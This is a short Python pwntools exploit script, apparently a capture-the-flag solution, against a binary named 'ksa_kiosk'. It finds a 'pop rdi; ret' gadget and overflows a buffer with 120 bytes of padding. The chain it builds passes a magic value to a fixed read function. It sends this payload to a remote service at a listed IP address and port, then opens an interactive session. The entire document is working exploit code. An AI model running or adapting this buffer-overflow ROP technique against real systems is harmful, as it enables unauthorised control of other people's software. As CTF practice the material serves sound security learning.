from pwn import *

elf = ELF('./ksa_kiosk')

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])
pop_rdi = pop_rdi.address
print(f'{hex(pop_rdi)=}')

read_func = 0x004013ac
code = 0x1337c0decafebeef

gdbscript = [ 'b *0x401686' ]  
gdbscript = '\n'.join(gdbscript)
# p = gdb.debug('./ksa_kiosk', gdbscript=gdbscript, aslr=False)
p = remote('66.228.49.41', 5000)

'''
    [ padding ] [ pop_rdi ] [ code ] [ read_func ]
'''

p.recvuntil(b'> ')
p.sendline(b'1')

p.recvuntil(b'> ')
p.sendline(b'a')

p.recvuntil(b'> ')


offset = 120
pad = b'a' * offset
# ret = 0xaabbccdd
payload = pad + p64(pop_rdi) + p64(code) + p64(read_func)

p.sendline(payload)

p.interactive()